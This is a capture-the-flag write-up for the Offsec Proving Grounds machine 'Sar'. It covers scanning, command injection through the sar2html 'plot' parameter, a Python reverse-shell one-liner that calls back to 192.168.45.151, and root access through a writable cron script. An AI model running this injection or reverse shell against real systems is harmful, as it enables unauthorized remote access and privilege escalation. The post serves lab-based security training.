---
title: "Proving grounds Play: Sar"
layout: post
date: 2023-07-23 12:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Pg-Play
- Linux
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---
## NMAP
```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3340be13cf517dd6a59c64c813e5f29f (RSA)
|   256 8a4eab0bdee3694050989858328f719e (ECDSA)
|_  256 e62f551cdbd0bb469280dd5f8ea30a41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Fuzzing for Directories and Files

```sh
000000069:   200        375 L    964 W      10918 Ch    "index.html"                           
000000157:   403        9 L      28 W       279 Ch      ".htaccess"                            
000000248:   200        1 L      1 W        9 Ch        "robots.txt"                           
000000279:   200        1172 L   5873 W     95674 Ch    "phpinfo.php"
```

**Sar v3.21**

![img](/assets/images/CTF/Proving_Grounds/Sar/sar.png)

## Searchsploit

![img](/assets/images/CTF/Proving_Grounds/Sar/searchsploit.png)

## Remote Code Execution

As per the exploit code the param `plot` is vulnerable to remote code execution.

```py
def exploiter(cmd):
    global url
    sess = requests.session()
    output = sess.get(f"{url}/index.php?plot=;{cmd}")       #vulnerable
    try:
        out = re.findall("<option value=(.*?)>", output.text)
    except:
        print ("Error!!")
    for ouut in out:
        if "There is no defined host..." not in ouut:
            if "null selected" not in ouut:
                if "selected" not in ouut:
                    print (ouut)
    print ()
```

**Python Reverse Shell**

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.151",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## Reverse Shell Obtained

![img](/assets/images/CTF/Proving_Grounds/Sar/local.png)

## Privilege Escalation

Crontab running a cron job every 5 minutes.

![img](/assets/images/CTF/Proving_Grounds/Sar/cron.png)

Listing permissions for the script file.

![img](/assets/images/CTF/Proving_Grounds/Sar/cron_file.png)

### Script contents

**Finally.sh**

```sh
#!/bin/sh

./write.sh
```

**write.sh**

```sh
#!/bin/sh

touch /tmp/gateway
```

Added python revershell to the `write.sh` file, so when the cronjob runs the write.sh file it will runs as `root`.

![img](/assets/images/CTF/Proving_Grounds/Sar/write_sh.png)

## Root Obtained

![img](/assets/images/CTF/Proving_Grounds/Sar/root.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).